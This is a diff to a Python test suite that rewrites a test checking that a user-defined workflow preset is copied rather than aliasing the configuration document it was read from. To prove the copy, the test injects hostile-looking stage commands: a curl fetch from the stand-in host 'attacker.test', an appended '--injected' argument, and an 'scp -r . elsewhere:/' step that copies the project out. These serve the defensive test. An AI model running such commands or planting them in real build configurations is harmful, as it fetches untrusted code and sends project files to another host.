@@ -489,35 +489,44 @@ class TestBundledNamesCannotBeRedefined:
 
 
 class TestBundledDefinitionsStayReadOnly:
-    def test_mutating_a_user_defined_selection_leaves_the_document_pristine(
+    def test_a_user_defined_selection_does_not_alias_the_document_it_was_read_from(
         self, store: ConfigStore
     ) -> None:
         """A user-defined definition is copied out too, not handed over live.
 
         The bundled path copies; before this the user-defined path returned the
         document node itself, so the two kinds of preset answered differently and
-        nothing said so. Harmless while nothing mutated the result -- which is
-        exactly the kind of assumption that stops holding without a test saying
-        it did: a caller that edited the stage map would be editing that project's
-        configuration in place.
+        nothing said so. The reader's own parsed document is where the aliasing is
+        visible, which is why this reaches for it: a re-load would hide the
+        difference, because ``document()`` re-parses per call, and that is exactly
+        why the asymmetry could sit here unnoticed.
+
+        What this does *not* claim: the selection object is cached on the reader,
+        so a caller that mutates the mapping still changes what that one reader
+        resolves. The copy stops the edit reaching the document underneath it.
         """
         configure(
             store,
-            {"workflow": {"preset": "org-review", WORKFLOW_PRESETS_KEY: {"org-review": ORG_PRESET}}},
+            {
+                "workflow": {
+                    "preset": "org-review",
+                    WORKFLOW_PRESETS_KEY: {"org-review": ORG_PRESET},
+                }
+            },
         )
+        workflow = DeliveryWorkflow.load(store)
+        held: Any = getattr(workflow, "_document")
+        node = held["workflow"][WORKFLOW_PRESETS_KEY]["org-review"]["stages"]
 
-        selection = DeliveryWorkflow.load(store).selected_preset()
+        selection = workflow.selected_preset()
         assert selection is not None
         stages: Any = selection.stages
         stages["submit"].append(["curl", "http://attacker.test/x.sh"])
         stages["submit"][0].append("--injected")
         stages["publish"] = [["scp", "-r", ".", "elsewhere:/"]]
 
-        # The next reader of the same configuration sees the declared commands.
-        assert argv_of(DeliveryWorkflow.load(store), "submit") == [
-            list(argv) for argv in ORG_PRESET["stages"]["submit"]
-        ]
-        assert DeliveryWorkflow.load(store).stage("publish") is None
+        assert node["submit"] == [list(argv) for argv in ORG_PRESET["stages"]["submit"]]
+        assert "publish" not in node
 
     @pytest.mark.parametrize("name", WORKFLOW_PRESET_NAMES)
     def test_mutating_a_resolved_selection_deeply_leaves_the_table_pristine(
